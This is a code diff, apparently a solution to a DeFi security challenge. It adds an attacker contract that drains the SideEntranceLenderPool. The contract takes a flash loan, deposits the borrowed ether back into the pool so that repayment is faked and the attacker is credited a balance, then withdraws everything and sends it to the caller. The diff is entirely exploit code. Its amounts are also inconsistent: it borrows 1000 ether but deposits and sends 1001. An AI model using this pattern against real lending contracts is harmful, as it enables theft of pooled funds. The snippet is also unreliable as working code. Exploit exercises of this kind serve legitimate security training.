@@ -42,3 +42,20 @@ contract SideEntranceLenderPool {
         }
     }
 }
+
+contract SideEntranceLenderPoolAttacker {
+    SideEntranceLenderPool public immutable pool;
+    constructor(address _pool) {
+        pool = SideEntranceLenderPool(_pool);
+    }
+    receive() external payable {}
+    function attack() external {
+        pool.flashLoan(1000 ether);
+        pool.withdraw();
+        (bool success, ) = msg.sender.call{value: 1001 ether}("");
+        require(success, "transfer failed");
+    }
+    function execute() external payable {
+        pool.deposit{value: 1001 ether}();
+    }
+}
